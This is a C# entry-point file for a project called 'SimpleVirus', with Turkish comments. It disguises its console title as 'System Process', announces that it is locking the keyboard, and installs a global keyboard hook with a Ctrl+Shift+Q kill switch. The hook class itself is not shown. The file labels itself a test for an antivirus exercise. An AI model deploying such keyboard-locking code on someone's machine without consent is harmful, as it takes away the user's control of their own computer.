using System;
using System.IO;
using System.Windows.Forms;
using SimpleVirus;

namespace SimpleVirus
{
    internal class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // Konsol başlığını ayarla (hata olursa devam et)
            try
            {
                Console.Title = "System Process";
            }
            catch (IOException)
            {
                // Konsol penceresi yoksa devam et
            }
            
            // Test klasörünü oluştur (güvenlik için)
            string testFolder = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                "basit antivirüs",
                "TestFolder"
            );
            
            if (!Directory.Exists(testFolder))
            {
                Directory.CreateDirectory(testFolder);
            }

            // Konsol mesajları (konsol yoksa hata vermez)
            try
            {
                Console.WriteLine("Basit Virüs Başlatılıyor...");
                Console.WriteLine("Klavye kilitleniyor. Kapatmak için Ctrl+Shift+Q tuşlarına basın.");
                Console.WriteLine("UYARI: Bu sadece test amaçlıdır!");
            }
            catch (IOException)
            {
                // Konsol penceresi yoksa devam et
            }
            
            // Keyboard hook'u başlat
            KeyboardHook hook = new KeyboardHook();
            hook.Install();
            
            // Kill switch kontrolü
            hook.KillSwitchPressed += (sender, e) =>
            {
                try
                {
                    Console.WriteLine("\nGüvenli kapatma aktif edildi. Virüs kapatılıyor...");
                }
                catch (IOException)
                {
                    // Konsol penceresi yoksa devam et
                }
                hook.Uninstall();
                Application.Exit();
                Environment.Exit(0);
            };

            // Uygulamayı çalışır durumda tut
            Application.Run();
        }
    }
}

